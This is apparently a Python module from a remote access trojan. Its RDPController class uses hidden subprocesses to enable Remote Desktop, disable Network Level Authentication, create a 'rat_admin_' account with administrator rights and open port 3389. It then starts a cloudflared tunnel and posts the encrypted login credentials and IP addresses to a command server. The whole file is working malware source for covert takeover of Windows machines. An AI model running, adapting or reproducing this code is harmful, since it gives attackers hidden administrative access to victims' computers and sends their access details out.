import logging
import os
import json
import socket
import subprocess
import uuid
import winreg
import requests
import ctypes
import time
import string
import random
import sys
import re
from typing import Dict, Optional, Any
from config import Config
from encryption.manager import EncryptionManager
from network.communicator import ServerCommunicator

class RDPController:
    def __init__(self, encryption_manager: EncryptionManager):
        self.encryption = encryption_manager
        self.communicator = ServerCommunicator(Config.get_client_id(), encryption_manager)
        self.username = f"rat_admin_{uuid.uuid4().hex[:8]}"
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        self.password = ''.join(random.choice(chars) for _ in range(14))  # 14-character password
        self.cloudflared_process = None
        self.tunnel_url = None
        self.rdp_wrapper_installed = False
        if Config.DEBUG_MODE:
            logging.info(f"RDPController initialized. User: {self.username}, Pass: {self.password[:4]}****")

    def _is_admin(self) -> bool:
        """Check for Administrator access"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception as e:
            logging.error(f"Admin check error: {str(e)}")
            return False

    def _run_command(self, cmd: list, timeout: int = 30) -> Dict[str, str]:
        """Execute command with advanced error handling"""
        try:
            logging.debug(f"Executing: {' '.join(cmd)}")
            result = subprocess.run(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=timeout,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            output = {
                "status": "success" if result.returncode == 0 else "error",
                "stdout": result.stdout.strip(),
                "stderr": result.stderr.strip()
            }
            if "longer than 14 characters" in output['stderr']:
                output['stderr'] += "\n[WARN] Legacy Windows password restriction detected!"
            elif "The specified rule already exists" in output['stderr']:
                output['status'] = "success"
                output['stderr'] += "\n[INFO] Rule already exists"
            elif "Access is denied" in output['stderr']:
                output['stderr'] += "\n[ERROR] Insufficient permissions"
            logging.debug(f"Command result: {output}")
            return output
        except Exception as e:
            logging.error(f"Command execution crashed: {str(e)}")
            return {"status": "error", "stdout": "", "stderr": str(e)}

    def _user_exists(self, username: str) -> bool:
        """Check if user exists"""
        try:
            ps_command = f"Get-LocalUser -Name '{username}' -ErrorAction SilentlyContinue"
            result = self._run_command(["powershell", "-Command", ps_command])
            return result["status"] == "success" and username in result["stdout"]
        except Exception as e:
            logging.error(f"User check failed: {str(e)}")
            return False

    def _is_user_in_group(self, username: str, group: str) -> bool:
        """Check if user is in group"""
        try:
            ps_command = f"Get-LocalGroupMember -Group '{group}' -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name"
            result = self._run_command(["powershell", "-Command", ps_command])
            return result["status"] == "success" and username in result["stdout"]
        except Exception as e:
            logging.error(f"Group check failed: {str(e)}")
            return False

    def _start_service(self, service_name: str) -> bool:
        """Start service"""
        try:
            result = self._run_command(["sc", "query", service_name])
            if result["status"] == "success" and "RUNNING" not in result["stdout"]:
                logging.info(f"Starting service {service_name}...")
                result = self._run_command(["net", "start", service_name])
                if result["status"] != "success":
                    logging.error(f"Failed to start service {service_name}: {result['stderr']}")
                    return False
            logging.info(f"Service {service_name} is running")
            return True
        except Exception as e:
            logging.error(f"Service start failed: {str(e)}")
            return False

    def _configure_firewall(self) -> bool:
        """Configure firewall with multiple methods and strong validation"""
        logging.info("Configuring firewall rules for RDP...")

        # Clean up old rules
        cleanup_commands = [
            ["netsh", "advfirewall", "firewall", "delete", "rule", "name=Allow RDP"],
            ["powershell", "-Command", "Remove-NetFirewallRule -DisplayName 'Allow RDP' -ErrorAction SilentlyContinue"],
            ["powershell", "-Command", "Remove-NetFirewallRule -DisplayName 'AllowRDP' -ErrorAction SilentlyContinue"]
        ]
        for cmd in cleanup_commands:
            result = self._run_command(cmd)
            if result["status"] == "success":
                logging.info(f"Cleaned up firewall rule: {cmd[0]}")
            else:
                logging.debug(f"Cleanup command {cmd[0]} output: {result['stderr']}")

        # Firewall rule creation methods
        methods = [
            {
                "type": "powershell_new",
                "cmd": [
                    "powershell", "-Command",
                    "New-NetFirewallRule -DisplayName 'Allow RDP' -Direction Inbound "
                    "-Action Allow -Protocol TCP -LocalPort 3389 -Profile Any -Enabled True"
                ],
                "validation": lambda: self._run_command(
                    ["powershell", "-Command", "Get-NetFirewallRule -DisplayName 'Allow RDP' -ErrorAction SilentlyContinue | Where-Object { $_.Enabled -eq $True }"]
                )["status"] == "success"
            },
            {
                "type": "powershell_set",
                "cmd": [
                    "powershell", "-Command",
                    "if (Get-NetFirewallRule -DisplayName 'Allow RDP' -ErrorAction SilentlyContinue) { "
                    "Set-NetFirewallRule -DisplayName 'Allow RDP' -Enabled True -Direction Inbound "
                    "-Action Allow -Protocol TCP -LocalPort 3389 -Profile Any } else { "
                    "New-NetFirewallRule -DisplayName 'Allow RDP' -Direction Inbound "
                    "-Action Allow -Protocol TCP -LocalPort 3389 -Profile Any -Enabled True }"
                ],
                "validation": lambda: self._run_command(
                    ["powershell", "-Command", "Get-NetFirewallRule -DisplayName 'Allow RDP' -ErrorAction SilentlyContinue | Where-Object { $_.Enabled -eq $True }"]
                )["status"] == "success"
            },
            {
                "type": "netsh",
                "cmd": [
                    "netsh", "advfirewall", "firewall", "add", "rule",
                    "name=Allow RDP", "dir=in", "action=allow",
                    "protocol=TCP", "localport=3389", "profile=any", "enable=yes"
                ],
                "validation": lambda: "Enabled: Yes" in self._run_command(
                    ["netsh", "advfirewall", "firewall", "show", "rule", "name=Allow RDP"]
                )["stdout"]
            }
        ]

        # Attempt to create rule
        for attempt in range(3):
            logging.info(f"Firewall configuration attempt {attempt+1}")
            for method in methods:
                try:
                    result = self._run_command(method["cmd"])
                    logging.debug(f"Firewall {method['type']} result: {result}")
                    if result["status"] == "success":
                        if method["validation"]():
                            logging.info(f"Firewall rule applied via {method['type']}")
                            return True
                        else:
                            logging.warning(f"Validation failed for {method['type']}: {result['stdout'][:100]}...")
                    else:
                        logging.warning(f"Failed to apply rule via {method['type']}: {result['stderr'][:100]}...")
                except Exception as e:
                    logging.error(f"Error in firewall method {method['type']}: {str(e)}")
                time.sleep(2)

        # Manual port check
        if self._check_port(3389):
            logging.info("Port 3389 is open despite firewall rule failure; proceeding")
            return True

        logging.error("All firewall configuration methods failed")
        return False

    def _create_user(self) -> bool:
        """Create user with hybrid system"""
        logging.info(f"Creating user {self.username}")

        if self._user_exists(self.username):
            logging.info(f"User {self.username} exists, resetting password...")
            result = self._run_command(["net", "user", self.username, self.password[:14]])
            if result["status"] == "success":
                return True
            logging.error(f"Failed to reset password: {result['stderr']}")
            return False

        methods = [
            {
                "type": "netuser",
                "cmd": ["net", "user", self.username, self.password[:14], "/add"],
                "validation": lambda: self._user_exists(self.username)
            },
            {
                "type": "powershell",
                "cmd": [
                    "powershell", "-Command",
                    f"$pass = ConvertTo-SecureString '{self.password}' -AsPlainText -Force; "
                    f"New-LocalUser -Name '{self.username}' -Password $pass -AccountNeverExpires -Description 'RDP User'"
                ],
                "validation": lambda: self._user_exists(self.username)
            }
        ]

        for method in methods:
            for attempt in range(3):
                result = self._run_command(method["cmd"])
                if result["status"] == "success" and method["validation"]():
                    logging.info(f"User created via {method['type']}")
                    return True
                logging.warning(f"User creation attempt {attempt+1} via {method['type']} failed: {result['stderr']}")
                time.sleep(1)
        
        logging.error("All user creation methods failed")
        return False

    def _configure_user_groups(self) -> bool:
        """Configure user groups"""
        groups = ["Administrators", "Remote Desktop Users"]
        for group in groups:
            if not self._is_user_in_group(self.username, group):
                for attempt in range(3):
                    cmd = ["net", "localgroup", group, self.username, "/add"]
                    result = self._run_command(cmd)
                    if result["status"] == "success":
                        logging.info(f"Added {self.username} to {group}")
                        break
                    logging.warning(f"Failed to add to {group}, attempt {attempt+1}: {result['stderr']}")
                    time.sleep(1)
                else:
                    logging.error(f"Failed to add {self.username} to {group}")
                    return False
        return True

    def _enable_rdp_registry(self) -> bool:
        """Enable RDP in registry"""
        try:
            reg_path = r"SYSTEM\CurrentControlSet\Control\Terminal Server"
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "fDenyTSConnections", 0, winreg.REG_DWORD, 0)
                winreg.SetValueEx(key, "fAllowToGetHelp", 0, winreg.REG_DWORD, 1)

            reg_path_tcp = r"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path_tcp, 0, winreg.KEY_SET_VALUE) as key:
                winreg.SetValueEx(key, "PortNumber", 0, winreg.REG_DWORD, 3389)

            result = self._run_command([
                "reg", "add", r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp",
                "/v", "UserAuthentication", "/t", "REG_DWORD", "/d", "0", "/f"
            ])
            if result["status"] == "success":
                logging.info("NLA disabled for RDP compatibility")

            result = self._run_command(["gpupdate", "/force"])
            if result["status"] == "success":
                logging.info("Group Policy updated")
            else:
                logging.warning(f"Group Policy update failed: {result['stderr']}")

            logging.info("RDP enabled in registry")
            return True
        except Exception as e:
            logging.error(f"Registry error: {str(e)}")
            return False

    def _check_port(self, port: int) -> bool:
        """Check if port is open"""
        try:
            for attempt in range(3):
                result = self._run_command(["netstat", "-an"])
                if result["status"] == "success" and f":{port}" in result["stdout"] and "LISTENING" in result["stdout"]:
                    logging.info(f"Port {port} is open")
                    return True
                logging.debug(f"Port check attempt {attempt+1} failed")
                time.sleep(2)
            logging.warning(f"Port {port} is not open")
            return False
        except Exception as e:
            logging.error(f"Port check failed: {str(e)}")
            return False

    def _configure_cloudflare_hostname(self) -> bool:
        """Configure Cloudflare Public Hostname for RDP"""
        try:
            # Handle cloudflared path for PyInstaller
            if getattr(sys, 'frozen', False):
                base_path = sys._MEIPASS
            else:
                base_path = os.path.dirname(__file__)
            cloudflared_path = os.path.join(base_path, Config.CLOUDFLARE_BINARY)
            if not os.path.exists(cloudflared_path):
                logging.error(f"Cloudflared binary not found at {cloudflared_path}")
                return False

            # Validate configuration
            if not Config.CLOUDFLARE_SUBDOMAIN or not Config.CLOUDFLARE_DOMAIN or not Config.CLOUDFLARE_TUNNEL_TOKEN:
                logging.error("Cloudflare subdomain, domain, or tunnel token missing in config")
                return False

            # Create Public Hostname
            hostname = f"{Config.CLOUDFLARE_SUBDOMAIN}.{Config.CLOUDFLARE_DOMAIN}"
            cloudflared_cmd = [
                cloudflared_path, "tunnel", "route", "dns",
                "rdp-tunnel", hostname
            ]
            result = self._run_command(cloudflared_cmd)
            if result["status"] != "success":
                logging.error(f"Failed to create DNS record for {hostname}: {result['stderr']}")
                return False
            logging.info(f"DNS record for {hostname} created")

            # Configure Public Hostname for RDP
            config_yaml_path = os.path.join(base_path, "config.yml")
            config_content = f"""tunnel: rdp-tunnel
credentials-file: {os.path.join(base_path, 'cloudflared_credentials.json')}
ingress:
  - hostname: {hostname}
    service: rdp://localhost:3389
  - service: http_status:404
"""
            with open(config_yaml_path, "w") as f:
                f.write(config_content)

            # Save tunnel credentials
            with open(os.path.join(base_path, "cloudflared_credentials.json"), "w") as f:
                json.dump({"AccountTag": "", "TunnelSecret": Config.CLOUDFLARE_TUNNEL_TOKEN, "TunnelID": ""}, f)

            # Start tunnel
            tunnel_cmd = [
                cloudflared_path, "tunnel", "--config", config_yaml_path,
                "run", "rdp-tunnel"
            ]
            self.cloudflared_process = subprocess.Popen(
                tunnel_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )

            # Wait for tunnel URL
            timeout = 30
            start_time = time.time()
            while time.time() - start_time < timeout:
                if self.cloudflared_process.poll() is not None:
                    stdout, stderr = self.cloudflared_process.communicate()
                    logging.error(f"Cloudflared terminated with error: {stderr[:100]}...")
                    return False
                line = self.cloudflared_process.stdout.readline().strip()
                if line and hostname in line:
                    self.tunnel_url = hostname
                    logging.info(f"Cloudflare tunnel started: {hostname}")
                    return True
                time.sleep(0.5)

            logging.error("Cloudflare tunnel startup timeout")
            return False
        except Exception as e:
            logging.error(f"Cloudflare hostname configuration failed: {str(e)}")
            return False

    def _start_cloudflare_tunnel(self) -> Optional[str]:
        """Start Cloudflare Tunnel"""
        if self._configure_cloudflare_hostname():
            return self.tunnel_url
        return None

    def _get_manual_fallback_instructions(self, local_ip: str, public_ip: str) -> str:
        """Get fallback instructions if tunnel fails"""
        instructions = (
            f"Cloudflare tunnel failed. Manual port forwarding required:\n"
            f"1. Access your router's admin panel (e.g., http://192.168.1.1).\n"
            f"2. Log in (check router manual for default username/password).\n"
            f"3. Navigate to 'Port Forwarding' or 'Virtual Servers'.\n"
            f"4. Create a new rule:\n"
            f"   - External Port: 3389\n"
            f"   - Internal Port: 3389\n"
            f"   - Protocol: TCP\n"
            f"   - Internal IP: {local_ip}\n"
            f"5. Save settings.\n"
            f"6. Connect to RDP using: {public_ip}:3389\n"
            f"   Username: {self.username}\n"
            f"   Password: {self.password}\n"
            f"Note: If {public_ip} is 'unknown', use 'curl ifconfig.me' or visit https://whatismyipaddress.com."
        )
        return instructions

    def enable_rdp(self) -> Dict[str, Any]:
        """Enable RDP fully"""
        try:
            if not self._is_admin():
                return {"status": "error", "message": "Admin rights required"}

            if not self._enable_rdp_registry():
                return {"status": "error", "message": "Registry configuration failed"}

            if not self._create_user():
                return {"status": "error", "message": "User creation failed"}

            if not self._configure_user_groups():
                return {"status": "error", "message": "Group configuration failed"}

            firewall_success = self._configure_firewall()
            if not firewall_success:
                logging.warning("Firewall configuration failed; proceeding")

            if not self._check_port(3389):
                logging.warning("Port 3389 is not open; attempting to restart services")
                for service in ["TermService", "SessionEnv", "UmRdpService"]:
                    if not self._start_service(service):
                        return {"status": "error", "message": f"Service {service} failed"}
                time.sleep(5)
                if not self._check_port(3389):
                    return {"status": "error", "message": "Port 3389 is not open after retries"}

            services = ["TermService", "SessionEnv", "UmRdpService"]
            for service in services:
                if not self._start_service(service):
                    return {"status": "error", "message": f"Service {service} failed"}

            local_ip = self._get_local_ip()
            public_ip = self._get_public_ip()
            tunnel_url = self._start_cloudflare_tunnel()

            connection_info = {
                "username": self.username,
                "password": self.password,
                "local_ip": local_ip,
                "public_ip": public_ip,
                "port": 3389,
                "firewall_status": "success" if firewall_success else "failed"
            }

            if tunnel_url:
                connection_info["hostname"] = tunnel_url
                connection_info["connection_instructions"] = (
                    f"Connect to RDP using: {tunnel_url}\n"
                    f"Username: {self.username}\n"
                    f"Password: {self.password}\n"
                    f"Note: Use Microsoft Remote Desktop or a Cloudflare-compatible RDP client."
                )
            else:
                connection_info["connection_instructions"] = self._get_manual_fallback_instructions(local_ip, public_ip)
                return {
                    "status": "manual",
                    "message": "Cloudflare tunnel failed. Manual port forwarding required.",
                    "data": connection_info
                }

            try:
                encrypted_info = self.encryption.encrypt(json.dumps(connection_info))
                payload = {
                    "action": "report_rdp",
                    "client_id": Config.get_client_id(),
                    "rdp_info": encrypted_info,
                    "token": Config.SECRET_TOKEN
                }
                response = requests.post(
                    Config.SERVER_URL,
                    json=payload,
                    headers={"X-Secret-Token": Config.SECRET_TOKEN},
                    timeout=15,
                    verify=True
                )
                if response.status_code != 200:
                    logging.error(f"Failed to send RDP info to server: {response.text}")
                else:
                    logging.info("RDP info sent to server")
            except Exception as e:
                logging.error(f"Server communication failed: {str(e)}")

            return {
                "status": "success",
                "message": "RDP enabled successfully via Cloudflare tunnel.",
                "data": connection_info
            }
        except Exception as e:
            logging.error(f"Critical error: {str(e)}")
            return {"status": "error", "message": f"Operation failed: {str(e)}"}

    def disable_rdp(self) -> Dict[str, Any]:
        """Disable RDP"""
        try:
            # Stop Cloudflare tunnel
            if self.cloudflared_process:
                self.cloudflared_process.terminate()
                self.cloudflared_process.wait(timeout=5)
                logging.info("Cloudflare tunnel stopped")

            if self._user_exists(self.username):
                result = self._run_command(["net", "user", self.username, "/delete"])
                if result["status"] == "success":
                    logging.info(f"User {self.username} deleted")
                else:
                    logging.warning(f"Failed to delete user: {result['stderr']}")

            try:
                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Terminal Server", 0, winreg.KEY_SET_VALUE) as key:
                    winreg.SetValueEx(key, "fDenyTSConnections", 0, winreg.REG_DWORD, 1)
                self._run_command(["gpupdate", "/force"])
                logging.info("RDP disabled in registry")
            except Exception as e:
                logging.warning(f"Registry disable failed: {str(e)}")

            for service in ["TermService", "SessionEnv", "UmRdpService"]:
                result = self._run_command(["net", "stop", service, "/y"])
                if result["status"] == "success":
                    logging.info(f"Service {service} stopped")
                else:
                    logging.warning(f"Failed to stop service {service}: {result['stderr']}")

            cleanup_commands = [
                ["netsh", "advfirewall", "firewall", "delete", "rule", "name=Allow RDP"],
                ["powershell", "-Command", "Remove-NetFirewallRule -DisplayName 'Allow RDP' -ErrorAction SilentlyContinue"]
            ]
            for cmd in cleanup_commands:
                self._run_command(cmd)
            logging.info("Firewall rules removed")

            return {"status": "success", "message": "RDP disabled successfully"}
        except Exception as e:
            logging.error(f"Disable failed: {str(e)}")
            return {"status": "error", "message": f"Disable failed: {str(e)}"}

    def _get_local_ip(self) -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception as e:
            logging.error(f"Local IP error: {str(e)}")
            return "unknown"

    def _get_public_ip(self) -> str:
        """Get public IP with multiple services"""
        services = [
            "https://api.ipify.org?format=json",
            "https://ifconfig.me/ip",
            "https://api.myip.com"
        ]
        for service in services:
            try:
                response = requests.get(service, timeout=10)
                if response.status_code == 200:
                    if "json" in service:
                        return response.json().get("ip", "unknown")
                    return response.text.strip()
                logging.warning(f"Failed to get public IP from {service}: {response.status_code}")
            except Exception as e:
                logging.warning(f"Public IP error from {service}: {str(e)}")
        logging.error("All public IP services failed. Check network or use 'curl ifconfig.me'.")
        return "unknown"